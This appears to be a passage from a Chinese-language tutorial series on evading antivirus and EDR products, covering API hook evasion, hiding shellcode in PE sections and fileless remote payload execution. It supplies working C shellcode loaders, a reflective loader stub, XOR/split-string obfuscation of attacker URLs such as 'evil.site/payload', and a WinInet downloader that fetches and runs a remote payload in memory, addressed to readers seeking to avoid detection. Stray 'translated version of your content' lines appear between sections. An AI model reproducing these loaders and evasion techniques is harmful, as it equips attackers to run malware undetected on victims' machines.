class="hljs-string">&quot;VirtualAlloc is hooked!&quot;</span> &lt;&lt; std::endl;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;VirtualAlloc is clean.&quot;</span> &lt;&lt; std::endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="规避用户态钩取："><a href="#规避用户态钩取：" class="headerlink" title="规避用户态钩取："></a><strong>规避用户态钩取：</strong></h3><h3 id="选项-1：使用系统调用"><a href="#选项-1：使用系统调用" class="headerlink" title="选项 1：使用系统调用"></a><strong>选项 1：使用系统调用</strong></h3><p>避免使用高级Windows API，转而使用<strong>本地系统调用（syscalls）</strong>。</p>
<blockquote>
<p>在第2.7节中我们已经详细探讨过这个技巧。</p>
</blockquote>
<hr>
<h3 id="选项-2：DLL的手动映射"><a href="#选项-2：DLL的手动映射" class="headerlink" title="选项 2：DLL的手动映射"></a><strong>选项 2：DLL的手动映射</strong></h3><p>加载一个干净的DLL副本到内存并自己解析API地址。</p>
<p><strong>步骤：</strong></p>
<ol>
<li><p>从磁盘读取DLL</p>
</li>
<li><p>手动映射到内存（不使用LoadLibrary）</p>
</li>
<li><p>手动解析PE结构</p>
</li>
<li><p>解析导出并使用干净的函数</p>
</li>
</ol>
<blockquote>
<p><code>Reflective DLL Injection</code>、<code>PE-sieve</code>和<code>HollowsHunter</code>等工具使用了类似的原理。</p>
</blockquote>
<hr>
<h3 id="内核级钩取"><a href="#内核级钩取" class="headerlink" title="内核级钩取"></a><strong>内核级钩取</strong></h3><h3 id="定义：-5"><a href="#定义：-5" class="headerlink" title="定义："></a><strong>定义：</strong></h3><ul>
<li><p>通过驱动程序实现</p>
</li>
<li><p>钩取系统服务，如SSDT、IRP处理程序和回调函数，监控进程&#x2F;线程&#x2F;映像&#x2F;加载事件</p>
</li>
</ul>
<h3 id="SSDT钩取示例（概念性）："><a href="#SSDT钩取示例（概念性）：" class="headerlink" title="SSDT钩取示例（概念性）："></a><strong>SSDT钩取示例（概念性）</strong>：</h3><p>在Windows内核中：</p>
<ul>
<li><p>系统调用表（SSDT）包含系统服务的指针</p>
</li>
<li><p>恶意软件或EDR可以将表项替换为其自己的处理程序</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 驱动中的伪代码</span><br>OldZwOpenProcess = KeServiceDescriptorTable-&gt;ServiceTable[ZwOpenProcessIndex];<br>KeServiceDescriptorTable-&gt;ServiceTable[ZwOpenProcessIndex] = MyHook;<br></code></pre></td></tr></table></figure>

<h3 id="检测SSDT钩取："><a href="#检测SSDT钩取：" class="headerlink" title="检测SSDT钩取："></a><strong>检测SSDT钩取：</strong></h3><p>使用以下工具进行检测：</p>
<ul>
<li><p><strong>GMER</strong></p>
</li>
<li><p><strong>WinDbg</strong>与内核符号</p>
</li>
<li><p><strong>PE-sieve</strong>（支持驱动程序）</p>
</li>
</ul>
<hr>
<h3 id="规避内核级钩取："><a href="#规避内核级钩取：" class="headerlink" title="规避内核级钩取："></a><strong>规避内核级钩取：</strong></h3><ol>
<li><p><strong>直接系统调用</strong>：避免完全绕过API层，直接使用系统调用</p>
</li>
<li><p><strong>DKOM（直接内核对象操作）</strong>：更为复杂的根kit级方法</p>
</li>
<li><p><strong>影子SSDT &#x2F; ETW绕过</strong>：更高级的方法（在后续模块中详细讨论）</p>
</li>
</ol>
<hr>
<h3 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a><strong>实际案例</strong></h3><h3 id="FIN7-Carbanak"><a href="#FIN7-Carbanak" class="headerlink" title="FIN7 &#x2F; Carbanak"></a><strong>FIN7 &#x2F; Carbanak</strong></h3><ul>
<li><p>通过哈希解析所有API</p>
</li>
<li><p>避免了IAT和钩取的API</p>
</li>
<li><p>使用内联系统调用包装器调用<code>NtWriteVirtualMemory</code>、<code>NtCreateThreadEx</code></p>
</li>
</ul>
<h3 id="Cobalt-Strike-Beacon"><a href="#Cobalt-Strike-Beacon" class="headerlink" title="Cobalt Strike (Beacon)"></a><strong>Cobalt Strike (Beacon)</strong></h3><ul>
<li><p>使用系统调用和手动映射</p>
</li>
<li><p>包括EDR卸载工具和带有修补版ntdll的shellcode加载器</p>
</li>
</ul>
<h3 id="Sliver-C2-Havoc"><a href="#Sliver-C2-Havoc" class="headerlink" title="Sliver C2 &#x2F; Havoc"></a><strong>Sliver C2 &#x2F; Havoc</strong></h3><ul>
<li><p>提供系统调用混淆</p>
</li>
<li><p>手动PE注入并支持用户态卸载</p>
</li>
</ul>
<hr>
<h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a><strong>结论</strong></h3><ul>
<li><p>EDR高度依赖API钩取，尤其是在用户态层。</p>
</li>
<li><p>您可以通过直接系统调用、手动映射或恢复原始字节来绕过用户态钩取。</p>
</li>
<li><p>内核级钩取更难规避，但通过仅使用系统调用、DKOM和其他隐蔽技术可以实现规避。</p>
</li>
</ul>
<p>Here’s the translated version of your content:</p>
<hr>
<h1 id="模块-4：Shellcode-和有效载荷-–-PE-部分、远程有效载荷托管和基于图像的注入"><a href="#模块-4：Shellcode-和有效载荷-–-PE-部分、远程有效载荷托管和基于图像的注入" class="headerlink" title="模块 4：Shellcode 和有效载荷 – PE 部分、远程有效载荷托管和基于图像的注入"></a>模块 4：Shellcode 和有效载荷 – PE 部分、远程有效载荷托管和基于图像的注入</h1><h2 id="AV-EDR规避实用技术-4-1-在规避中的PE节理解读（-text、-data、-rdata）"><a href="#AV-EDR规避实用技术-4-1-在规避中的PE节理解读（-text、-data、-rdata）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 4.1 - 在规避中的PE节理解读（.text、.data、.rdata）"></a>AV&#x2F;EDR规避实用技术 - 4.1 - 在规避中的PE节理解读（.text、.data、.rdata）</h2><p>可移植可执行文件（PE）格式是Windows识别和加载可执行文件（<code>.exe</code>）和动态链接库（<code>.dll</code>）的方式。了解如何操控或滥用这些节对于恶意软件作者和红队成员在避免被检测时至关重要。</p>
<hr>
<h3 id="关键PE节概述"><a href="#关键PE节概述" class="headerlink" title="关键PE节概述"></a><strong>关键PE节概述</strong></h3><table>
<thead>
<tr>
<th>节</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>包含程序的可执行指令，通常标记为PAGE_EXECUTE_READ。</td>
</tr>
<tr>
<td>.data</td>
<td>存储已初始化的全局和静态变量，具有读写权限的内存。</td>
</tr>
<tr>
<td>.rdata</td>
<td>只读数据，通常包括字符串字面量、常量以及导入地址表（IAT）。</td>
</tr>
<tr>
<td>.bss</td>
<td>存储未初始化的全局&#x2F;静态变量，在文件中不占空间，但会在内存中分配。</td>
</tr>
<tr>
<td>.rsrc</td>
<td>用于存储应用程序资源，如图标、版本信息、位图、对话框等。</td>
</tr>
</tbody></table>
<hr>
<h3 id="EDR如何利用这些信息"><a href="#EDR如何利用这些信息" class="headerlink" title="EDR如何利用这些信息"></a><strong>EDR如何利用这些信息</strong></h3><p>AV&#x2F;EDR引擎通常认为<code>.text</code>节包含可执行逻辑。如果shellcode出现在<code>.data</code>、<code>.rdata</code>或动态分配的内存中，它可能绕过初步的静态分析启发式检测——尤其是在没有与已知恶意API流或签名相关联时。</p>
<hr>
<h3 id="用例1：在-data节中注入Shellcode"><a href="#用例1：在-data节中注入Shellcode" class="headerlink" title="用例1：在.data节中注入Shellcode"></a><strong>用例1：在.data节中注入Shellcode</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// Shellcode有效负载（例如，用msfvenom生成的MessageBox有效负载）</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = &#123;<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-comment">// NOPs（用于填充）</span><br>    <span class="hljs-comment">// 真实的shellcode</span><br>&#125;;<br><br><span class="hljs-comment">// 存储在.data节中，而不是.text节</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">execute_payload</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 分配带有执行权限的内存</span><br>    <span class="hljs-type">void</span> *exec_mem = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-keyword">if</span> (!exec_mem) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc失败。\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 将shellcode复制到分配的内存中</span><br>    <span class="hljs-built_in">memcpy</span>(exec_mem, payload, <span class="hljs-keyword">sizeof</span>(payload));<br><br>    <span class="hljs-comment">// 执行有效负载</span><br>    ((<span class="hljs-type">void</span>(*)())exec_mem)(); <span class="hljs-comment">// 转换为函数并调用</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a><strong>解释：</strong></h4><ul>
<li><p>该代码将有效负载存储在<code>.data</code>节中，避免了<code>.text</code>节。</p>
</li>
<li><p>一些AV可能在静态签名扫描时跳过<code>.data</code>节。</p>
</li>
<li><p>执行是通过<code>VirtualAlloc</code>动态发生的，这是一种常见的策略。</p>
</li>
</ul>
<hr>
<h3 id="用例2：在-rdata中隐藏字符串"><a href="#用例2：在-rdata中隐藏字符串" class="headerlink" title="用例2：在.rdata中隐藏字符串"></a><strong>用例2：在.rdata中隐藏字符串</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 只读字符串——属于.rdata节的一部分</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *url = <span class="hljs-string">&quot;http://malicious-domain.com/payload.bin&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>恶意软件可以通过以下方式对其进行混淆：</p>
<ul>
<li><p>将字符串分割为若干部分</p>
</li>
<li><p>对其进行编码（例如，Base64、XOR）</p>
</li>
<li><p>使用<code>strcat</code>或<code>sprintf</code>在运行时构建</p>
</li>
</ul>
<p>EDR通常会监控<code>.rdata</code>和<code>.text</code>中的可疑常量。动态生成有助于规避检测。</p>
<hr>
<h3 id="用例3：在运行时修改内存权限"><a href="#用例3：在运行时修改内存权限" class="headerlink" title="用例3：在运行时修改内存权限"></a><strong>用例3：在运行时修改内存权限</strong></h3><p>现代Windows PE加载器强制执行DEP（数据执行保护），但通过正确调用<code>VirtualAlloc</code>或<code>NtProtectVirtualMemory</code>可以覆盖这一保护。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD oldProtect;<br>VirtualProtect(&amp;payload, <span class="hljs-keyword">sizeof</span>(payload), PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br>((<span class="hljs-type">void</span>(*)())payload)();<br></code></pre></td></tr></table></figure>

<p>在此示例中：</p>
<ul>
<li><p>无需分配新内存；shellcode直接从<code>.data</code>节执行。</p>
</li>
<li><p>直接调整内存保护。</p>
</li>
<li><p>一些AV无法追踪内存保护与内联执行的组合，特别是在经过混淆的情况下。</p>
</li>
</ul>
<hr>
<h3 id="真实案例：Cobalt-Strike伪装"><a href="#真实案例：Cobalt-Strike伪装" class="headerlink" title="真实案例：Cobalt Strike伪装"></a><strong>真实案例：Cobalt Strike伪装</strong></h3><p>Cobalt Strike通常通过反射加载器交付shellcode：</p>
<ul>
<li><p>嵌入在PE的<code>.rdata</code>或<code>.data</code>节中</p>
</li>
<li><p>加密后在运行时解密</p>
</li>
<li><p>使用<code>CreateThread</code>、<code>NtCreateThreadEx</code>或直接<code>syscall</code>等技术执行</p>
</li>
</ul>
<p>有效负载从不存储在最终二进制文件的<code>.text</code>节中。</p>
<hr>
<h3 id="进阶：为有效负载创建自定义PE节"><a href="#进阶：为有效负载创建自定义PE节" class="headerlink" title="进阶：为有效负载创建自定义PE节"></a><strong>进阶：为有效负载创建自定义PE节</strong></h3><p>一些恶意软件作者进一步添加了<strong>自定义节</strong>（例如<code>.evil</code>或<code>.stub</code>），并将shellcode放置其中。</p>
<h3 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a><strong>为什么？</strong></h3><ul>
<li><p>避免默认节的检测启发式扫描</p>
</li>
<li><p>将shellcode隐藏在看似未使用或加密的节中</p>
</li>
</ul>
<p><strong>创建自定义节需要编辑PE头文件，并使用链接器脚本或二进制修补工具，如PE-bear或CFF Explorer。</strong></p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><table>
<thead>
<tr>
<th>节</th>
<th>在恶意软件规避中的用途</th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>现代规避恶意软件中很少用于有效负载，因为太过明显。</td>
</tr>
<tr>
<td>.data</td>
<td>常用于shellcode，尤其是当内存保护被动态修改时。</td>
</tr>
<tr>
<td>.rdata</td>
<td>用于存储加密的shellcode或数据，如URLs、密钥。</td>
</tr>
<tr>
<td>自定义</td>
<td>恶意软件作者添加的节，用于隐藏shellcode，避开静态扫描。</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-手动节注入（例如，-evil、-xyz）"><a href="#1-手动节注入（例如，-evil、-xyz）" class="headerlink" title="1. 手动节注入（例如，.evil、.xyz）"></a><strong>1. 手动节注入（例如，<code>.evil</code>、<code>.xyz</code>）</strong></h3><p>你可以修改已编译的PE文件，使用如<strong>PE-bear</strong>或<strong>CFF Explorer</strong>等工具插入新的节。</p>
<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a><strong>步骤：</strong></h4><ol>
<li><p>在PE-bear中打开PE文件。</p>
</li>
<li><p>添加一个带有<code>PAGE_EXECUTE_READWRITE</code>标志的新节。</p>
</li>
<li><p>将加密或编码的shellcode附加到该节。</p>
</li>
<li><p>在加载器中使用<code>VirtualProtect</code>或<code>NtProtectVirtualMemory</code>解密并执行它。</p>
</li>
</ol>
<p><strong>为什么有效：</strong></p>
<ul>
<li><p>大多数静态扫描工具仅分析<code>.text</code>、<code>.rdata</code>和已知入口点。</p>
</li>
<li><p>一个名为<code>.xyz</code>的节，其中包含无法读取的内容（经过熵混淆），通常会被忽略或没有深入分析。</p>
</li>
</ul>
<hr>
<h3 id="2-通过节重定位规避YARA规则"><a href="#2-通过节重定位规避YARA规则" class="headerlink" title="2. 通过节重定位规避YARA规则"></a><strong>2. 通过节重定位规避YARA规则</strong></h3><p>YARA规则可能会寻找<code>.text</code>或<code>.rdata</code>中的字符串模式。你可以通过以下方式打破此规则：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> part1[] = <span class="hljs-string">&quot;http&quot;</span>;<br><span class="hljs-type">char</span> part2[] = <span class="hljs-string">&quot;://&quot;</span>;<br><span class="hljs-type">char</span> part3[] = <span class="hljs-string">&quot;evil.site/payload&quot;</span>;<br><span class="hljs-type">char</span> full_url[<span class="hljs-number">64</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">obfuscate_string</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">strcpy</span>(full_url, part1);<br>    <span class="hljs-built_in">strcat</span>(full_url, part2);<br>    <span class="hljs-built_in">strcat</span>(full_url, part3);<br>    <span class="hljs-comment">// 现在可以使用full_url来获取远程有效负载</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>甚至更好，可以动态编码和解码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> encoded[] = &#123; <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(encoded); ++i) &#123;<br>        encoded[i] ^= <span class="hljs-number">0x23</span>;<br>    &#125;<br>    <span class="hljs-comment">// 现在encoded包含真实的字符串</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>检测规避：</strong></p>
<ul>
<li><p>防止基本的YARA签名匹配编码字符串</p>
</li>
<li><p>当存储在<code>.data</code>并从堆中执行时，检测向量进一步收窄</p>
</li>
</ul>
<hr>
<h3 id="3-完全基于内存的执行（无修改节）"><a href="#3-完全基于内存的执行（无修改节）" class="headerlink" title="3. 完全基于内存的执行（无修改节）"></a><strong>3. 完全基于内存的执行（无修改节）</strong></h3><p>通过反射DLL注入或shellcode加载器，你可以：</p>
<ul>
<li><p>将有效负载嵌入资源（而不是<code>.text</code>或<code>.data</code>）</p>
</li>
<li><p>使用<code>LoadLibrary</code>和<code>GetProcAddress</code>动态加载它</p>
</li>
<li><p>使用<code>NtAllocateVirtualMemory</code>和<code>NtWriteVirtualMemory</code>模拟<code>VirtualAlloc</code>和<code>memcpy</code>，而不使用AV&#x2F;EDR监控的API</p>
</li>
</ul>
<h4 id="示例：从内存加载PE"><a href="#示例：从内存加载PE" class="headerlink" title="示例：从内存加载PE"></a><strong>示例：从内存加载PE</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 这是简化版，真实的反射加载器更复杂</span><br><span class="hljs-type">void</span>* <span class="hljs-title function_">LoadReflectivePE</span><span class="hljs-params">(BYTE* payload)</span> &#123;<br>    <span class="hljs-comment">// 为有效负载分配内存</span><br>    <span class="hljs-type">void</span>* mem = VirtualAlloc(<span class="hljs-literal">NULL</span>, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-keyword">if</span> (mem) &#123;<br>        <span class="hljs-built_in">memcpy</span>(mem, payload, payload_size);<br>        ((<span class="hljs-type">void</span>(*)())mem)(); <span class="hljs-comment">// 调用加载的PE</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<ul>
<li><p>从不写入磁盘</p>
</li>
<li><p>节点在内存中重建</p>
</li>
<li><p>从内存映射缓冲区开始执行——AV更难追踪</p>
</li>
</ul>
<hr>
<h3 id="4-真实世界案例：Astaroth恶意软件"><a href="#4-真实世界案例：Astaroth恶意软件" class="headerlink" title="4. 真实世界案例：Astaroth恶意软件"></a><strong>4. 真实世界案例：Astaroth恶意软件</strong></h3><p>Astaroth恶意软件（以无文件技术著称）：</p>
<ul>
<li><p>在<code>.rdata</code>中投放有效负载，并进行混淆</p>
</li>
<li><p>使用<code>WMIC</code>和<code>Bitsadmin</code>通过LOLBin执行代码</p>
</li>
<li><p>使用<strong>节映射技巧</strong>反射加载模块，而不执行<code>.text</code>中的代码</p>
</li>
</ul>
<hr>
<h3 id="5-用于节检查和修"><a href="#5-用于节检查和修" class="headerlink" title="5. 用于节检查和修"></a><strong>5. 用于节检查和修</strong></h3><p>补的工具**</p>
<table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PE-bear</strong></td>
<td>高级PE文件静态分析器，能够添加&#x2F;编辑&#x2F;删除节。</td>
</tr>
<tr>
<td><strong>CFF Explorer</strong></td>
<td>用于可视化编辑PE头、导入表和节的工具。</td>
</tr>
<tr>
<td><strong>LordPE</strong></td>
<td>旧但强大的节管理和RVA修补工具。</td>
</tr>
<tr>
<td><strong>custom pe_parser.py</strong></td>
<td>使用Python和pefile解析、读取、修改PE头和节。</td>
</tr>
</tbody></table>
<p> 使用<code>pefile</code>（Python）示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pefile<br><br>pe = pefile.PE(<span class="hljs-string">&quot;sample.exe&quot;</span>)<br><br><span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> pe.sections:<br>    <span class="hljs-built_in">print</span>(section.Name, <span class="hljs-built_in">hex</span>(section.VirtualAddress), <span class="hljs-built_in">hex</span>(section.Misc_VirtualSize))<br><br><span class="hljs-comment"># 这里可以添加或重命名节（例如，将.text改为.text2）</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-节头错位"><a href="#6-节头错位" class="headerlink" title="6. 节头错位"></a><strong>6. 节头错位</strong></h3><p>一些恶意软件作者通过修改<code>SectionAlignment</code>和<code>FileAlignment</code>值来打破反汇编器或迷惑AV解析器。<br>其他人则隐藏有效负载于重叠的节中，或在<code>reloc</code>和<code>debug</code>段内。</p>
<hr>
<h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>滥用PE节是AV&#x2F;EDR规避的核心策略之一。你可以：</p>
<ul>
<li><p>将有效负载隐藏在<code>.data</code>、<code>.rdata</code>或新自定义的节中</p>
</li>
<li><p>完全避免<code>.text</code>，以防触发静态检测</p>
</li>
<li><p>动态解码字符串和有效负载</p>
</li>
<li><p>纯粹从内存中加载和执行有效负载（无文件）</p>
</li>
<li><p>修改PE头和对齐方式以规避反汇编器</p>
</li>
</ul>
<p>当结合以下内容时，这些知识变得更有力量：</p>
<ul>
<li><p>手动修补工具</p>
</li>
<li><p>YARA分析规避</p>
</li>
<li><p>运行时解密</p>
</li>
<li><p>间接系统调用和API卸载</p>
</li>
</ul>
<p>Here’s the translated version of your content:</p>
<hr>
<h2 id="AV-EDR规避实用技术-4-2-远程有效负载托管与执行"><a href="#AV-EDR规避实用技术-4-2-远程有效负载托管与执行" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 4.2 - 远程有效负载托管与执行"></a>AV&#x2F;EDR规避实用技术 - 4.2 - 远程有效负载托管与执行</h2><p><strong>主题聚焦</strong>：将有效负载托管在远程服务器上，通过下载并在内存中执行来规避检测机制，从而避免磁盘写入。</p>
<hr>
<h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>AV和EDR监控：</p>
<ul>
<li><p>磁盘活动（<code>CreateFile</code>，<code>WriteFile</code>）</p>
</li>
<li><p>进程创建</p>
</li>
<li><p>内存分配模式</p>
</li>
</ul>
<p>为了绕过这些监控，恶意软件通常：</p>
<ul>
<li><p><strong>将有效负载托管在远程服务器上</strong></p>
</li>
<li><p><strong>动态下载</strong></p>
</li>
<li><p><strong>在内存中加载并执行（反射执行或手动映射）</strong></p>
</li>
</ul>
<p>这种技术通常被称为<strong>无文件执行</strong>。</p>
<hr>
<h3 id="1-托管有效负载"><a href="#1-托管有效负载" class="headerlink" title="1. 托管有效负载"></a><strong>1. 托管有效负载</strong></h3><p>你可以将shellcode或PE有效负载托管在以下位置：</p>
<ul>
<li><p>HTTP&#x2F;HTTPS服务器</p>
</li>
<li><p>公共平台（例如，GitHub、Pastebin、Bitbucket）</p>
</li>
<li><p>云服务（例如，Dropbox、OneDrive）</p>
</li>
<li><p>隐蔽通道（例如，图片中的隐写术）</p>
</li>
</ul>
<p>为简便起见，假设使用HTTP服务器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在本地HTTP服务器上托管payload.bin</span><br>python3 -m http.server 8080<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-下载器存根（Shellcode加载器）代码示例"><a href="#2-下载器存根（Shellcode加载器）代码示例" class="headerlink" title="2. 下载器存根（Shellcode加载器）代码示例"></a><strong>2. 下载器存根（Shellcode加载器）代码示例</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wininet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;wininet.lib&quot;</span>)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DownloadAndExecute</span><span class="hljs-params">()</span> &#123;<br>    HINTERNET hInternet, hFile;<br>    DWORD bytesRead;<br>    BYTE buffer[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>]; <span class="hljs-comment">// 1 MB 缓冲区</span><br><br>    hInternet = InternetOpen(<span class="hljs-string">&quot;Updater&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    hFile = InternetOpenUrl(hInternet, <span class="hljs-string">&quot;http://127.0.0.1:8080/payload.bin&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, INTERNET_FLAG_RELOAD, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hFile) &#123;<br>        InternetReadFile(hFile, buffer, <span class="hljs-keyword">sizeof</span>(buffer), &amp;bytesRead);<br>        <span class="hljs-comment">// 为有效负载分配内存</span><br>        LPVOID exec = VirtualAlloc(<span class="hljs-number">0</span>, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>        <span class="hljs-built_in">memcpy</span>(exec, buffer, bytesRead);<br>        <span class="hljs-comment">// 将内存转为函数指针并执行</span><br>        ((<span class="hljs-type">void</span>(*)())exec)();<br>    &#125;<br><br>    InternetCloseHandle(hFile);<br>    InternetCloseHandle(hInternet);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="代码注释："><a href="#代码注释：" class="headerlink" title="代码注释："></a><strong>代码注释：</strong></h3><ul>
<li><p><code>InternetOpenUrl</code> 用于从远程主机读取二进制有效负载。</p>
</li>
<li><p><code>VirtualAlloc</code> 用于为执行分配可读写执行内存。</p>
</li>
<li><p>整个执行过程是无文件的——没有任何东西触及磁盘。</p>
</li>
<li><p>这能够绕过大多数基于签名的AV和沙盒检测。</p>
</li>
</ul>
<hr>
<h3 id="3-使用该技术的真实恶意软件"><a href="#3-使用该技术的真实恶意软件" class="headerlink" title="3. 使用该技术的真实恶意软件"></a><strong>3. 使用该技术的真实恶意软件</strong></h3><ul>
<li><p><strong>Ursnif&#x2F;Gozi</strong>：从受感染的WordPress网站下载加密的有效负载。</p>
</li>
<li><p><strong>Emotet</strong>：使用Base64和XOR混淆有效负载，通常通过HTTP GET请求以误导的User-Agent进行检索。</p>
</li>
<li><p><strong>Cobalt Strike Beacon</strong>：当阶段化时，可以通过类似curl的请求在内存中检索。</p>
</li>
</ul>
<hr>
<h3 id="4-可选：AES-XOR加密有效负载"><a href="#4-可选：AES-XOR加密有效负载" class="headerlink" title="4. 可选：AES&#x2F;XOR加密有效负载"></a><strong>4. 可选：AES&#x2F;XOR加密有效负载</strong></h3><p>为了避免网络级检测（如IDS&#x2F;IPS或网络级AV引擎），可以将有效负载加密存储在磁盘上，并在下载后在内存中解密。</p>
